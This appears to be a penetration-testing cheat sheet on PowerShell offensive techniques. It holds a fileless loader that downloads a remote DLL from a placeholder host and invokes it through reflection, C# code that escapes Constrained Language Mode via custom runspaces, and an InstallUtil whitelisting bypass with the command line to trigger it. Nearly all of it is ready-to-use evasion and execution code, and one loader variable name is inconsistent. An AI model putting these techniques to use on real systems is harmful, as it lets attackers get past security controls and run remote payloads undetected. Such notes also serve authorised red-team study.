# PowerShell

### Run Reflective Assembly

This method does not touch disk \(see C\# section in payloads for possible payloads\):

```text
public class Payload
{
    public static void Run()
    {
        // ...
    }
}
```

```text
$data = (New-Object System.Net.WebClient).DownloadData('http://<ip>/payload.dll')
$asm = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("Payload.Class1")
$method = $class.GetMethod("Run")
$method.Invoke(0, $null)
```

### Constrained Language Mode

Print Language Mode with `$ExecutionContext.SessionState.LanguageMode` . When constrained, we can not use parts of the language, for example .NET framework functions.

#### Custom Runspaces

We can get Full Language mode back via Custom Runspaces in C\#:

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace CustomRunspaces {
    class Program {
        static void Main(string[] args) {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.AddScript("<cmd>");
            ps.Invoke();
            rs.Close();            
        }
    }
}
```

### InstallUtil

We can leverage the uninstall method \(install would require admin privileges\):

```csharp
using System;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace InstallUtilBypass {
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer{
        public override void Uninstall(System.Collections.IDictionary savedState){
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript("<cmd>");
            ps.Invoke();
            rs.Close();
        }
    }

    class Program {
        static void Main(string[] args){
            // does not matter
        }
    }
}
```

Call via:

```text
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U <payload.exe>
```

